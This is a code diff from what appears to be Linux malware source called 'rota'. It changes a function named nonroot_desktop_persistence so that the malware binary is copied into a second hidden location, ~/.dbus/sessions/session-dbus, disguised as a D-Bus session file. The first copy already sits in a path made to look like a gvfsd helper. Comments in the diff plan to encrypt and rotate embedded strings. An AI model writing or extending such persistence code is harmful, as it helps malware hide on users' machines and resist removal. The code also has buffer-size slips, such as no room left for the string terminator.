@@ -127,10 +127,10 @@ bool nonroot_desktop_persistence() {
 
     // -------- copy userland binary now -------------
     //
-    // copy rota binary
+    // copy rota binary to /home/$USER/.fvfsd/.profile/gvfsd-helper
     // TODO convert gvfsd_helper into char array
     // TODO decrypt and rotate char array below
-    //
+
     char *gvfsd_helper= "/.gvfsd/.profile/gvfsd-helper";
     fpath_size = strlen(HOME) + strlen(gvfsd_helper);
     char *binpath = (char *)malloc(fpath_size);
@@ -173,14 +173,73 @@ bool nonroot_desktop_persistence() {
         }
     }
 
-    // write rota binary to persistence location.
-    bool rota_write = copy_rota_to_userland(binpath);
+    // write rota binary to /home/$USER/.gvfsd/.profile/gvfsd.
+    bool rota_write_gvfsd = copy_rota_to_userland(binpath);
 
-    if (rota_write == false) {
-        fprintf(stderr, "\n[rota]Error writing rota to %s.\tError : %s",
+    if (rota_write_gvfsd == false) {
+        fprintf(stderr, "\n[rota] Error writing rota to %s.\tError : %s",
                 binpath, strerror(errno));
     }
 
+    // -------- copy userland binary now -------------
+    //
+    // copy rota binary to /home/$USER/.dbus/sessions/session-dbus
+    // TODO convert session-dbus into an encrypted char array
+    // TODO decrypt and rotate char array below
+
+    char *session_dbus= "/.dbus/sessions/session-dbus";
+    fpath_size = strlen(HOME) + strlen(session_dbus);
+    char *binpath_session_dbus = (char *)malloc(fpath_size);
+    memset(binpath_session_dbus, 0, fpath_size);
+
+    strncat(binpath_session_dbus, HOME, strlen(HOME));
+    strncat(binpath_session_dbus, session_dbus, strlen(session_dbus));
+
+    char *dbus_dir = "/.dbus";
+    dirpath_size = strlen(HOME) + strlen(dbus_dir);
+    char *dbus_path = (char *)malloc(dirpath_size);
+    memset(dbus_path, 0, dirpath_size);
+
+    strncat(dbus_path, HOME, strlen(HOME));
+    strncat(dbus_path, dbus_dir, strlen(dbus_dir));
+
+    // if directory does not exist create it.
+    if (access(dbus_dir, F_OK) == -1) {
+        int res = mkdir(dbus_path, 0755);
+        if (res != 0) {
+            #ifdef DEBUG
+            fprintf(stderr, "\n[sessions/session-dbus] Error creating directory to %s\tError: %s",
+                dirpath_profile, strerror(errno));
+            #endif
+        }
+    }
+
+    char *dbus_sessions_dir = "/.dbus/sessions";
+    dirpath_size = strlen(HOME) + strlen(dbus_sessions_dir);
+    char *dbus_session_path = (char *)malloc(dirpath_size);
+    memset(dbus_session_path, 0, dirpath_size);
+
+    strncat(dbus_session_path, HOME, strlen(HOME));
+    strncat(dbus_session_path, dbus_sessions_dir, strlen(dbus_sessions_dir));
+
+    // if directory does not exist create it.
+    if (access(dbus_session_path, F_OK) == -1) {
+        int res = mkdir(dbus_session_path, 0755);
+        if (res != 0) {
+            #ifdef DEBUG
+            fprintf(stderr, "\n[sessions/session-dbus] Error creating directory to %s\tError: %s",
+                dirpath_profile, strerror(errno));
+            #endif
+        }
+    }
+
+    // write rota binary to /home/$USER/.dbus/sessions/session-dbus
+    bool rota_write_session_dbus = copy_rota_to_userland(binpath_session_dbus);
+
+    if (rota_write_session_dbus == false) {
+        fprintf(stderr, "\n[rota]Error writing rota to %s.\tError : %s",
+                binpath, strerror(errno));
+    }
 
     free(fpath);
     free(binpath);
